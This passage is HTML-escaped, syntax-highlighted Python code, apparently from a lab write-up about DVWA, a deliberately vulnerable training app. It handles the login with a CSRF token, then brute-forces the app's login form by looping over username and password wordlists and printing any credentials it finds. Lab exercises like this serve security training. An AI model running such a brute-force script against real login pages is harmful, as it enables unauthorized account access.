&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="c"&gt;# Make the request to the URL&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;[i] URL: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;/login.php&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;target&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;[i] Data: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;[i] Cookie: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;cookie&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;post&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;{0}/login.php&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;target&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;cookies&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;cookie&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;allow_redirects&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;False&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="k"&gt;except&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="c"&gt;# Feedback for the user (there was an error) &amp;amp; Stop execution of our request&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\n\n&lt;/span&gt;&lt;span class="s"&gt;[!] dvwa_login: Failed to connect (URL: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;/login.php).&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;[i] Quitting.&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;target&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="c"&gt;# Wasn't it a redirect?&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;status_code&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="mi"&gt;301&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;status_code&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="mi"&gt;302&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="c"&gt;# Feedback for the user (there was an error again) &amp;amp; Stop execution of our request&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\n\n&lt;/span&gt;&lt;span class="s"&gt;[!] dvwa_login: Page didn't response correctly (Response: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;).&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;[i] Quitting.&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;status_code&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="c"&gt;# Did we log in successfully?&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;headers&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Location&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="s"&gt;'index.php'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="c"&gt;# Feedback for the user (there was an error) &amp;amp; Stop execution of our request&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\n\n&lt;/span&gt;&lt;span class="s"&gt;[!] dvwa_login: Didn't login (Header: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;  user: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;  password: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;  user_token: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;  session_id: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;).&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;[i] Quitting.&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;          &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;headers&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Location&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="n"&gt;dvwa_user&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dvwa_pass&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;user_token&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;session_id&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="c"&gt;# If we got to here, everything should be okay!&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;[i] Logged in! (&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;/&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;)&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dvwa_user&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dvwa_pass&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;# Make the request to-do the brute force&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;url_request&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;session_id&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="c"&gt;# GET data&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="s"&gt;&amp;quot;username&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="s"&gt;&amp;quot;password&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="s"&gt;&amp;quot;Login&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;Login&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="c"&gt;# Cookie data&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="n"&gt;cookie&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="s"&gt;&amp;quot;PHPSESSID&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;session_id&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="s"&gt;&amp;quot;security&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;sec_level&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="c"&gt;# Make the request to the URL&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="c"&gt;#print &amp;quot;\n[i] URL: %s/vulnerabilities/brute/&amp;quot; % target&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="c"&gt;#print &amp;quot;[i] Data: %s&amp;quot; % data&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="c"&gt;#print &amp;quot;[i] Cookie: %s&amp;quot; % cookie&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;{0}/vulnerabilities/brute/&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;target&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;params&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;cookies&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;cookie&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;allow_redirects&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;False&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="k"&gt;except&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="c"&gt;# Feedback for the user (there was an error) &amp;amp; Stop execution of our request&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\n\n&lt;/span&gt;&lt;span class="s"&gt;[!] url_request: Failed to connect (URL: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;/vulnerabilities/brute/).&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;[i] Quitting.&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;target&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="c"&gt;# Was it a ok response?&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;status_code&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="mi"&gt;200&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="c"&gt;# Feedback for the user (there was an error again) &amp;amp; Stop execution of our request&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\n\n&lt;/span&gt;&lt;span class="s"&gt;[!] url_request: Page didn't response correctly (Response: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;).&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;[i] Quitting.&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;status_code&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="c"&gt;# We have what we need&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;# Main brute force loop&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;brute_force&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;session_id&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="c"&gt;# Load in wordlists files&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;pass_list&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="n"&gt;password&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;readlines&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;user_list&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="n"&gt;username&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;readlines&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="c"&gt;# Counter&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="c"&gt;# Loop around&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;PASS&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;USER&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;            &lt;span class="n"&gt;USER&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;USER&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;rstrip&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;'&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;            &lt;span class="n"&gt;PASS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;PASS&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;rstrip&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;'&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;            &lt;span class="c"&gt;# Increase counter&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;            &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;            &lt;span class="c"&gt;# Feedback for the user&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;            &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;[i] Try &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt; // &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;USER&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;PASS&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;            &lt;span class="c"&gt;# Make request&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;            &lt;span class="n"&gt;attempt&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;url_request&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;USER&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;PASS&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;session_id&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;            &lt;span class="c"&gt;#print attempt&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;            &lt;span class="c"&gt;# Check response&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;success&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;attempt&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;                &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\n\n&lt;/span&gt;&lt;span class="s"&gt;[i] Found!&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;                &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;[i] Username: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;USER&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;                &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;[i] Password: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PASS&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;                &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="bp"&gt;False&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;# Get initial CSRF token&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="n"&gt;session_id&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;user_token&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;csrf_token&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;# Login to web app&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="n"&gt;dvwa_login&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;session_id&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;user_token&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;# Start brute forcing&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="n"&gt;brute_force&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;session_id&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;hr /&gt;

